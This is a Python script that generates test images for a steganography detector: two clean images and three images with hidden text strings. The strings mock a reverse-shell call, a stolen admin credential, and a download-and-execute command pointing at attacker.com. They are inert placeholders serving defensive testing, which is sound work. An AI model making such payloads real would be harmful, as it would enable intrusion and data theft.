import os
from PIL import Image, ImageDraw
from steganography import encode_image

IMAGE_DIR = "images"

def create_base_image(filename, color, text):
    path = os.path.join(IMAGE_DIR, filename)
    img = Image.new('RGB', (200, 200), color=color)
    d = ImageDraw.Draw(img)
    d.text((50, 90), text, fill=(255, 255, 255))
    img.save(path)
    return path

def setup_test_suite():
    if not os.path.exists(IMAGE_DIR):
        os.makedirs(IMAGE_DIR)

    # 1. Create 2 Clear Images
    create_base_image("clear_1.png", (34, 139, 34), "SAFE IMAGE 1")
    create_base_image("clear_2.png", (70, 130, 180), "SAFE IMAGE 2")
    print("Created 2 clean images.")

    # 2. Create 3 Malicious/Hidden Images
    # Image 1: Mock Malware Payload
    base_3 = create_base_image("temp_3.png", (139, 0, 0), "SYSTEM UPDATE")
    encode_image(base_3, "MALWARE_PAYLOAD: execute_reverse_shell(ip='192.168.1.100')", os.path.join(IMAGE_DIR, "malicious_1.png"))
    os.remove(base_3)

    # Image 2: Credential Exfiltration
    base_4 = create_base_image("temp_4.png", (255, 140, 0), "HOLIDAY PHOTO")
    encode_image(base_4, "STOLEN_DATA: user='admin', pass='P@ssw0rd123'", os.path.join(IMAGE_DIR, "malicious_2.png"))
    os.remove(base_4)

    # Image 3: Command & Control String
    base_5 = create_base_image("temp_5.png", (75, 0, 130), "ENCRYPTED DATA")
    encode_image(base_5, "C2_COMMAND: download_and_exec('http://attacker.com/backdoor.exe')", os.path.join(IMAGE_DIR, "malicious_3.png"))
    os.remove(base_5)

    print("Created 3 malicious images with hidden payloads.")

if __name__ == "__main__":
    setup_test_suite()
